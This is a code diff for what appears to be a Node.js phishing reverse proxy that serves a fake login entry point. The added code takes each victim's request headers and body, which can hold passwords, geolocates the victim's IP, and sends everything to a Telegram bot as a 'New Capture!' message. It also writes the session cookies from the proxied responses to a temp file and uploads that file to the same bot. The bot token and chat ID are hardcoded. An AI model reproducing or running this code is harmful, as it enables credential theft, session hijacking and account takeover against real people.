@@ -2,14 +2,136 @@ const axios = require('axios');
 const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
 const CHAT_ID = '7310383191';
 
-async function sendToTelegram(data) {
-  try {
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: `🔐 New Capture!\n\n${JSON.stringify(data, null, 2)}`
-    });
-  } catch (e) { console.log('Telegram send failed', e.message); }
+// ================================================
+// 𝙶𝙴𝙾𝙻𝙾𝙲𝙰𝚃𝙸𝙾𝙽 & 𝙲𝙾𝙾𝙺𝙸𝙴 𝙵𝙸𝙻𝙴 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
+// ================================================
+
+async function getGeoInfo(ip) {
+    try {
+        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=country,countryCode,regionName,city,isp,org`);
+        return response.data;
+    } catch {
+        return { country: 'Unknown', countryCode: 'UN' };
+    }
 }
+
+function getFlagEmoji(countryCode) {
+    if (!countryCode || countryCode.length !== 2) return '🌍';
+    return String.fromCodePoint(
+        0x1F1E6 + countryCode.charCodeAt(0) - 65,
+        0x1F1E6 + countryCode.charCodeAt(1) - 65
+    );
+}
+
+function extractCookiesFromHeaders(headers) {
+    if (!headers || !headers['set-cookie']) return null;
+    const cookies = {};
+    const cookieArray = Array.isArray(headers['set-cookie']) 
+        ? headers['set-cookie'] 
+        : [headers['set-cookie']];
+    cookieArray.forEach(cookie => {
+        const [nameValue] = cookie.split(';');
+        const [name, value] = nameValue.split('=');
+        if (name && value) cookies[name.trim()] = value.trim();
+    });
+    return Object.keys(cookies).length ? cookies : null;
+}
+
+async function sendCookiesAsFile(cookies, sessionId) {
+    if (!cookies || Object.keys(cookies).length === 0) return;
+
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+    const randomName = Math.random().toString(36).substring(2, 10);
+    const filename = `session_${randomName}_${timestamp}.txt`;
+    const tmpDir = require('os').tmpdir();
+    const filePath = path.join(tmpDir, filename);
+
+    const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
+    fs.writeFileSync(filePath, content);
+
+    try {
+        const FormData = require('form-data');
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('document', fs.createReadStream(filePath), { filename: filename });
+        form.append('caption', `📎 Cookie file: ${filename}`);
+
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders()
+        });
+    } catch (e) {
+        console.log('Cookie file send failed', e.message);
+    }
+
+    try { fs.unlinkSync(filePath); } catch (e) {}
+}
+
+// ================================================
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
+// ================================================
+
+async function sendToTelegram(data) {
+    try {
+        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
+                   data.proxyRequestHeaders?.['x-real-ip'] || 
+                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   'Unknown';
+
+        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
+        let flag = '🌍';
+        let location = 'Unknown';
+
+        if (ip !== 'Unknown') {
+            geo = await getGeoInfo(ip);
+            flag = getFlagEmoji(geo.countryCode);
+            location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
+        }
+
+        const message = `
+🔐 **New Capture!**
+
+🌍 **IP:** ${ip}
+${flag} **Location:** ${location}
+🏢 **ISP:** ${geo.isp || 'N/A'}
+📡 **Org:** ${geo.org || 'N/A'}
+
+🕒 **Time:** ${data.timestamp || new Date().toISOString()}
+🔗 **URL:** ${data.proxyRequestURL || 'N/A'}
+📨 **Method:** ${data.proxyRequestMethod || 'N/A'}
+
+📋 **Headers:**
+\`\`\`json
+${JSON.stringify(data.proxyRequestHeaders || {}, null, 2)}
+\`\`\`
+
+📦 **Body:**
+\`\`\`json
+${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
+\`\`\`
+
+📊 **Response:** ${data.proxyResponseStatusCode || 'N/A'}
+        `;
+
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+
+        // 𝙰𝚝𝚝𝚊𝚌𝚑 𝚌𝚘𝚘𝚔𝚒𝚎𝚜 𝚊𝚜 .𝚝𝚡𝚝 𝚏𝚒𝚕𝚎
+        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
+        if (cookies) {
+            await sendCookiesAsFile(cookies, data.sessionId || 'unknown');
+        }
+
+    } catch (e) {
+        console.log('Telegram send failed', e.message);
+    }
+}
+
+// ================================================
+// 𝚁𝙴𝚂𝚃 𝙾𝙵 𝚈𝙾𝚄𝚁 𝙲𝙾𝙳𝙴 (𝚑𝚝𝚝𝚙, 𝚑𝚝𝚝𝚙𝚜, 𝚙𝚊𝚝𝚑, 𝚏𝚜, 𝚎𝚝𝚌.)
+// ================================================
 
 const http = require("http");
 const https = require("https");
@@ -17,7 +139,7 @@ const path = require("path");
 const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
-
+const os = require("os");
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
